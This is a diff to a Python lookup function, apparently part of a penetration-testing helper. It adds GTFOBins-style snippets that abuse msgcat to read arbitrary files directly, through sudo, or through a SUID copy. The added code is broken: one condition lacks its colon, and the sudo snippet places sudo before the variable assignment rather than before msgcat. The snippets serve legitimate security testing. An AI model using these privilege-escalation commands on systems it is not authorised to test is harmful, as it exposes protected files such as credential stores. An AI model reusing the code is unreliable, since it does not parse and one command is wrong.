@@ -2379,6 +2379,19 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "Shell":
             bins.append("N/A")
 
+    elif zip_command == "msgcat":
+        if zip_options == "file-read"
+            bins.append("LFILE=file_to_read\nmsgcat -P $LFILE")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_read\nmsgcat -P $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which msgcat) .\nLFILE=file_to_read\n./msgcat -P $LFILE")
+        elif zip_options == "Shell":
+            bins.append("N/A")
+        elif zip_options == "file-write":
+            bins.append("N/A")
+
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
